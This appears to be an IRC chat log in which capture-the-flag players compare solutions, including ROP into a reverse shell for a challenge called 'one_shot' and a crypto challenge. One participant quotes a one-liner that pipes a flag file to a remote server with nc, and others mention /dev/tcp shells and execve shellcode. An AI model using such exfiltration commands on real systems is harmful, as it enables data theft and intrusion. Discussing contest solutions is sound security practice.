@@ -1,0 +1,16 @@
+[04:19] <Eternal> what is the solution for one_shot ?
+[04:19] <@tsug0d> describe the ctf in two words guys :)
+[04:19] <Sceptic> Eternal: rop into a reverse shell
+
+04:24] <Shalom[p4]> this was ok
+[04:25] <Shalom[p4]> from hex/bin you could easily see
+[04:25] <@bmtd> many people dislike
+[04:25] <@bmtd> yeah
+[04:25] <Eternal> socket, connect, or bash from /dev/tcp ?
+
+[04:25] <Shalom[p4]> part2 was ok, you could see that randoms were about 128 bits and the multiplier was something like 0x100001
+[04:26] <WhoAmI> Eternal:  I used this one line command  "cat /home/one_shot/flag | nc server port"
+[04:26] <WhoAmI> and run some times
+[04:26] <bibi__> yeah
+[04:27] <sdfarhgeagdg> heeeeey, anyone know how to solve "house of cards"?
+[04:27] <WhoAmI> shellcode is just calling the execute syscall
